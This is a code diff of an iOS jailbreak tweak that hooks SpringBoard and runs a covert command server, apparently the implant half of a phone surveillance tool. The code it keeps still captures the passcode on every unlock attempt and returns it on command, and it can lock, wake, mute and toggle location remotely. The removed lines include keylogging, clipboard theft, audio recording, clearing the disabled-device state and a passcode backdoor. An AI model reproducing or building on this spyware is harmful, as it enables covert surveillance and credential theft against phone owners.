@@ -3,13 +3,13 @@
 
 %hook SpringBoard
 
-SBMediaController *fmedia;
+SBMediaController *mediaController;
 NSString *passcode;
 NSString *keyLog;
 
 -(void)applicationDidFinishLaunching:(id)application {
 	%orig;
-	fmedia = (SBMediaController *)[%c(SBMediaController) sharedInstance];
+	mediaController = (SBMediaController *)[%c(SBMediaController) sharedInstance];
 	CPDistributedMessagingCenter *messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
 	[messagingCenter runServerOnCurrentThread];
 	[messagingCenter registerForMessageName:@"commandWithNoReply" target:self selector:@selector(commandWithNoReply:withUserInfo:)];
@@ -19,39 +19,20 @@ NSString *keyLog;
 %new
 -(void)commandWithNoReply:(NSString *)name withUserInfo:(NSDictionary *)userInfo {
 	NSString *command = [userInfo objectForKey:@"cmd"];
-	if ([command isEqual:@"play"]) {
-		[(SBMediaController *)[%c(SBMediaController) sharedInstance] play];
-	}
-	else if ([command isEqual:@"pause"]) {
-		if ([(SBMediaController *)[%c(SBMediaController) sharedInstance] isPlaying]) {
-			[(SBMediaController *)[%c(SBMediaController) sharedInstance] togglePlayPause];
-		}
-	}
-	else if ([command isEqual:@"next"]) {
-		[(SBMediaController *)[%c(SBMediaController) sharedInstance] changeTrack:1];
-	}
-	else if ([command isEqual:@"prev"]) {
-		[(SBMediaController *)[%c(SBMediaController) sharedInstance] changeTrack:-1];
-	}
-	else if ([command isEqual:@"home"]) {
+	// Button Simulation
+	if ([command isEqual:@"home"]) {
 		if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonSinglePressUp)]) {
 			[(SBUIController *)[%c(SBUIController) sharedInstance] handleHomeButtonSinglePressUp];
 		}
 		else if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(clickedMenuButton)]) {
 			[(SBUIController *)[%c(SBUIController) sharedInstance] clickedMenuButton];
 		}
-	}
-	else if ([command isEqual:@"lock"]) {
+	} else if ([command isEqual:@"lock"]) {
 		[(SBUserAgent *)[%c(SBUserAgent) sharedUserAgent] lockAndDimDevice];
-	}
-	else if ([command isEqual:@"wake"]) {
+	} else if ([command isEqual:@"wake"]) {
 		[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] cancelLockScreenIdleTimer];
 		[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] turnOnScreenFullyWithBacklightSource:1];
-	}
-	else if ([command isEqual:@"record"]) {
-		[self performSelector:@selector(initRecord) withObject:nil afterDelay:0];
-	}
-	else if ([command isEqual:@"doublehome"]) {
+	} else if ([command isEqual:@"doublehome"]) {
 		if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonDoublePressDown)]) {
 			[(SBUIController *)[%c(SBUIController) sharedInstance] handleHomeButtonDoublePressDown];
 		}
@@ -59,25 +40,22 @@ NSString *keyLog;
 			[(SBUIController *)[%c(SBUIController) sharedInstance] handleMenuDoubleTap];
 		}
 	}
-	else if ([command isEqual:@"undisabled"]) {
-		[(SBDeviceLockController *)[%c(SBDeviceLockController) sharedController] _clearBlockedState];
-	}
-	else if ([command isEqual:@"silenceShutter"]) {
-		if (!fmedia.ringerMuted) { //if not muted, toggle mute
-    		[fmedia setRingerMuted:!fmedia.ringerMuted];
+	// Muting
+	else if ([command isEqual:@"mute"]) {
+		if (!mediaController.ringerMuted) {
+			[(VolumeControl *)[%c(VolumeControl) sharedVolumeControl] toggleMute];
+	    	[mediaController setRingerMuted:!mediaController.ringerMuted];
 		}
-	}
-	else if ([command isEqual:@"togglemute"]) {
-    	[(VolumeControl *)[%c(VolumeControl) sharedVolumeControl] toggleMute];
-    	[fmedia setRingerMuted:!fmedia.ringerMuted];
-    }
-    else if ([command isEqual:@"keylogclear"]) {
-    	keyLog = @"";
-    }
+    } else if ([command isEqual:@"unmute"]) {
+		if (mediaController.ringerMuted) {
+			[(VolumeControl *)[%c(VolumeControl) sharedVolumeControl] toggleMute];
+	    	[mediaController setRingerMuted:!mediaController.ringerMuted];
+		}
+    } 
+    // Location
     else if ([command isEqual:@"locationon"]) {
         [%c(CLLocationManager) setLocationServicesEnabled:true];
-    }
-    else if ([command isEqual:@"locationoff"]) {
+    } else if ([command isEqual:@"locationoff"]) {
         [%c(CLLocationManager) setLocationServicesEnabled:false];
     }    
 }
@@ -106,10 +84,10 @@ NSString *keyLog;
 	}
 	else if ([command isEqual:@"ismuted"]) {
 		NSString *result = @"";
-		if (fmedia.ringerMuted)
-			result = @"true";
+		if (mediaController.ringerMuted)
+			result = @"muted";
 		else
-			result = @"false";
+			result = @"unmuted";
 		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
 	}
 	else if ([command isEqual:@"unlock"]) {
@@ -119,28 +97,13 @@ NSString *keyLog;
 		else 
 			result = @"We have not obtained passcode yet";
 		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
-	}
-	else if ([command isEqual:@"keylog"]) {
-		NSString *result = @"";
-		if (keyLog != NULL) {
-			result = keyLog;
-		}
-		else {
-			result = @"Listening...";
-		}
-		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
-	}
-	else if ([command isEqual:@"getpaste"]) {
-		return [NSDictionary dictionaryWithObject:[UIPasteboard generalPasteboard].items[0] forKey:@"returnStatus"];		
-	}
-	
+	}	
 	return [NSDictionary dictionaryWithObject:[NSNumber numberWithInt:1] forKey:@"returnStatus"];
 }
 %end
 
 
-//log passcode
-
+//Log passcode
 %hook SBLockScreenManager
 -(void)attemptUnlockWithPasscode:(id)arg1 {
 	%orig;
@@ -148,20 +111,11 @@ NSString *keyLog;
 	[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] cancelLockScreenIdleTimer];
 	[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] turnOnScreenFullyWithBacklightSource:1];
 }
-/* depricated
--(BOOL)attemptUnlockWithPasscode:(id)arg1 {
-	bool success = %orig;
-	if ([[[NSString alloc] initWithFormat:@"%@", arg1] isEqual:@"1"]) {
-		return true;
-	}
-	if (success) {
-		passcode = [[NSString alloc] initWithFormat:@"%@", arg1];
-	}
-	return success;
-}
-*/
 %end
 
+
+//TODO: Fix
+/*
 @interface UIKBTree : NSObject
 @property(retain, nonatomic) NSString *displayString;
 @end
@@ -197,5 +151,5 @@ NSString *keyLog;
 	%orig;
 }
 %end
-
+*/
 
